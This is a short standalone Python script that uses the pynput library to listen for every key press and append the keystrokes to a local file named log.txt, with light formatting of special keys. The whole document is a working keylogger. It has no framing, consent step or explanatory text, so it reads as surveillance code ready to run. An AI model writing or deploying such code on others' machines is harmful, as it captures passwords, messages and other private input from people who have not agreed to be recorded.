import pynput
from pynput.keyboard import Listener

def write_to_file(key):
    keydata=str(key)
    keydata=keydata.replace("'", "")
    if keydata=="Key.space":
         keydata=" "    
    elif keydata.__contains__('Key.'):
         keydata=" '"+keydata+"' "
    with open('log.txt', 'a') as f:
        f.write(keydata)


with Listener(on_press=write_to_file) as l:
        l.join()


